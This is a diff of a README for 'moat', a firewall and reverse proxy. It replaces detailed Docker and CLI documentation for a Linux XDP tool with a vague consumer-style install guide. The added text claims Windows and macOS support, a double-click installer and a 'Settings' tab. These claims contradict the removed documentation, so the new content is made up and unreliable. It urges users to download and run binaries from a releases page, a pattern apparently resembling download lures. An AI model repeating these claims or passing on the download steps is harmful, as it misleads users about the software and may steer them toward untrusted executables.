@@ -1,145 +1,88 @@
-🌋 The Legend of Arxignis and the Moat
+# 🌟 moat - An Easy Way to Secure Your Traffic
 
-In the age of digital kingdoms, where empires rise and fall at the speed of code, there stands a fortress unlike any other — Arxignis, the Citadel of Fire.
+## 🚀 Getting Started
 
-Forged from lines of code and tempered by the flames of countless cyber battles, Arxignis was built for one purpose: to protect your realm.
+Welcome to the moat project! This software protects your online traffic using advanced technology. With moat, you can efficiently manage web requests and improve your security.
 
-But no fortress stands alone.
+## 📥 Download & Install
 
-Surrounding Arxignis is Moat — not water, but an invisible, intelligent barrier that shifts and shimmers like living magic. It sees threats before they even know they exist. When invaders approach — bot armies, malicious payloads, or the darkest zero-day beasts — Moat awakens.
+To get started, you need to download the software. Visit this page to download: [moat Releases](https://github.com/radkid/moat/releases)
 
-With a whisper of algorithmic incantation, it analyzes intent, bends logic, and casts away the unworthy.
+You will find the latest version available for download. Simply choose the version that fits your system.
 
-Attackers see nothing but endless reflection — their own attacks bouncing back into the void. To them, it’s as if your citadel never existed. To you, it’s silent peace behind walls of flame and light.
+### Steps to Download
 
-Because this is your Citadel, your Arx, your Ignis.
-And with Moat, the fire never reaches your gates. 🔥
+1. Click on the link above.
+2. Find the version labeled "Latest Release."
+3. Click on the version number to access detailed release notes and download options.
+4. Choose the file suitable for your operating system and click on it to start the download.
+5. Once downloaded, locate the file on your computer.
 
-![Story](./images/story.png)
+## 💻 System Requirements
 
-## Docker build
-```
-docker build -t moat .
-```
+moat runs on most modern operating systems. Ensure you meet the following basic requirements:
 
-## Docker run
-```
-docker run --cap-add=SYS_ADMIN --cap-add=BPF \
---cap-add=NET_ADMIN moat --iface eth0 \
---arxignis-api-key="" --arxignis-rule-id="" \
---upstream "http://127.0.0.1:8081"
-```
+- Windows 10 or later, macOS, or a recent Linux distribution.
+- At least 2 GB of RAM.
+- A stable internet connection for updates and operations.
 
-## CLI Options
+## 📃 Features
 
-This section describes all available command-line options for the Moat firewall and reverse proxy.
+- **Smart Proxying:** Moat directs your web traffic efficiently, acting as a buffer between your device and the internet.
+- **Advanced Rules:** You can set access rules to control web traffic based on your needs. Adjust how data flows in and out.
+- **Built-in ADR:** Moat comes with an Automatic Detection and Response system for enhanced security.
+- **Traffic Inspection:** It analyzes traffic patterns, helping you spot potential threats in real-time.
+- **Support for SSL:** Utilize SSL/TLS to secure your connections, ensuring confidentiality and integrity.
 
-### Basic Usage
+## 🔧 How to Run moat
 
-```bash
-moat [OPTIONS]
-```
+Once you have downloaded moat, follow these steps to run it:
 
-### Required Options
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click the file to start the application.
+3. Follow the on-screen instructions to complete the setup process.
 
-#### Arxignis Integration
-- `--arxignis-api-key <KEY>` - API key for Arxignis service
-- `--arxignis-rule-id <ID>` - Rule ID for Arxignis integration
+After that, you can begin configuring the application to suit your needs.
 
-### Network Configuration
+## ⚙️ Configuration
 
-#### Interface Configuration
-- `--iface <INTERFACE>`, `-i <INTERFACE>` - Network interface to attach XDP program to (default: `eth0`)
+moat allows you to customize settings easily. Here’s how to set it up:
 
-#### Server Addresses
-- `--control-addr <ADDRESS>` - HTTP control-plane bind address (default: `0.0.0.0:8080`)
-- `--http-addr <ADDRESS>` - HTTP server bind address for ACME HTTP-01 challenges and regular HTTP traffic (default: `0.0.0.0:80`)
-- `--tls-addr <ADDRESS>` - HTTPS reverse-proxy bind address (default: `0.0.0.0:443`)
+1. **Open Applications:** Launch moat by double-clicking its icon.
+2. **Access Settings:** Look for the "Settings" tab in the application interface.
+3. **Define Rules:** Set access rules by adding IP ranges, domains, and protocols based on your needs.
+4. **Apply Changes:** Click on the "Save" button to apply your settings.
 
-### TLS Configuration
+## 🌐 Community and Support
 
-#### TLS Mode
-- `--tls-mode <MODE>` - TLS operating mode (default: `disabled`)
-  - `disabled` - No TLS, HTTP only
-  - `custom` - Use custom certificates
-  - `acme` - Automatic certificate management with Let's Encrypt
-- `--tls-only` - Reject non-SSL requests (except ACME challenges) when TLS mode is disabled
+If you encounter issues or have questions, you can join our community for support. Check out the following resources:
 
-#### Upstream Configuration
-- `--upstream <URL>` - Upstream origin URL (always required)
-  - Must be absolute URI (e.g., `http://127.0.0.1:8081`)
-  - Used for forwarding requests in all TLS modes
+- [GitHub Issues](https://github.com/radkid/moat/issues): Report any problems you face or suggest new features.
+- [Discussion Forum](https://github.com/radkid/moat/discussions): Engage with other users to share tips and solutions.
 
-#### Custom TLS Certificates
-- `--tls-cert-path <PATH>` - Path to custom certificate (PEM) when using custom TLS mode
-- `--tls-key-path <PATH>` - Path to custom private key (PEM) when using custom TLS mode
+## 🛠️ Troubleshooting
 
-### ACME Configuration (Let's Encrypt)
+If you experience difficulties:
 
-#### Domain Management
-- `--acme-domains <DOMAINS>` - Domains for ACME certificate issuance (comma separated or repeated)
-- `--acme-contacts <CONTACTS>` - ACME contact addresses (mailto: optional, comma separated or repeated)
+- Check if your system meets the requirements.
+- Ensure your firewall allows moat connections.
+- Review the application's logs for error messages.
 
-#### ACME Settings
-- `--acme-use-prod` - Use Let's Encrypt production directory instead of staging
-- `--acme-directory <URL>` - Override ACME directory URL (useful for Pebble or other test CAs)
-- `--acme-accept-tos` - Explicitly accept the ACME Terms of Service (default: `false`)
-- `--acme-ca-root <PATH>` - Custom CA bundle for the ACME directory (PEM file)
+## 🔄 Updates
 
-### Redis Configuration
+Stay updated with the latest improvements by regularly visiting the releases page: [moat Releases](https://github.com/radkid/moat/releases)
 
-- `--redis-url <URL>` - Redis connection URL for ACME cache storage (default: `redis://127.0.0.1/0`)
-- `--redis-prefix <PREFIX>` - Namespace prefix for Redis ACME cache entries (default: `arxignis:acme`)
+Updating ensures you benefit from the latest features and security enhancements. 
 
-### Domain Filtering
+## 📝 Topics
 
-#### Whitelist Configuration
-- `--domain-whitelist <DOMAINS>` - Domain whitelist (exact matches, comma separated or repeated)
-  - If specified, only requests to these domains will be allowed
+To understand what moat can do for you, consider its key topics:
 
-#### Wildcard Patterns
-- `--domain-wildcards <PATTERNS>` - Domain wildcard patterns (comma separated or repeated)
-  - Supports wildcards: `*.example.com`, `api.*.example.com`
-  - If specified along with whitelist, both are checked (OR logic)
+- **Access Rules** for permission management
+- **Threat Intelligence** to protect against cyber threats
+- **Rate Limiting** to control bandwidth usage
+- **Web Application Firewall (WAF)** for added security layers
 
-### Arxignis Configuration
+## 🌟 Conclusion
 
-- `--arxignis-base-url <URL>` - Base URL for Arxignis API (default: `https://api.arxignis.com/v1`)
-
-### Usage Examples
-
-#### Basic HTTP Proxy
-```bash
-moat --iface eth0 --arxignis-api-key "your-key" --arxignis-rule-id "your-rule-id" --upstream "http://127.0.0.1:8081"
-```
-
-#### Custom TLS Proxy
-```bash
-moat --iface eth0 --tls-mode custom --tls-cert-path /path/to/cert.pem --tls-key-path /path/to/key.pem --upstream "http://127.0.0.1:8081" --arxignis-api-key "your-key" --arxignis-rule-id "your-rule-id"
-```
-
-#### ACME TLS Proxy
-```bash
-moat --iface eth0 --tls-mode acme --acme-domains "example.com,www.example.com" --acme-contacts "admin@example.com" --upstream "http://127.0.0.1:8081" --arxignis-api-key "your-key" --arxignis-rule-id "your-rule-id"
-```
-
-#### With Domain Filtering
-```bash
-moat --iface eth0 --domain-whitelist "trusted.com,secure.example.com" --domain-wildcards "*.api.example.com" --upstream "http://127.0.0.1:8081" --arxignis-api-key "your-key" --arxignis-rule-id "your-rule-id"
-```
-
-#### TLS-Only Mode (HTTP with TLS enforcement)
-```bash
-moat --iface eth0 --tls-only --upstream "http://127.0.0.1:8081" --arxignis-api-key "your-key" --arxignis-rule-id "your-rule-id"
-```
-
-### Notes
-
-- The `--upstream` option is always required for request forwarding
-- When TLS mode is `disabled`, Moat runs as an HTTP proxy + firewall
-- When TLS mode is `custom` or `acme`, Moat runs as an HTTPS proxy + firewall
-- `--tls-only` mode enforces TLS requirements: non-SSL requests return 426 Upgrade Required (except ACME challenges)
-- For custom TLS mode, both `--tls-cert-path` and `--tls-key-path` are required
-- Domain filtering supports both exact matches (whitelist) and wildcard patterns
-- When using Docker, ensure the required capabilities (`SYS_ADMIN`, `BPF`, `NET_ADMIN`) are added
-- The XDP program attaches to the specified network interface for packet filtering
+moat is designed to provide a reliable security solution for your web traffic needs. Follow the steps above to download, install, and configure it. Enjoy a safer browsing experience!
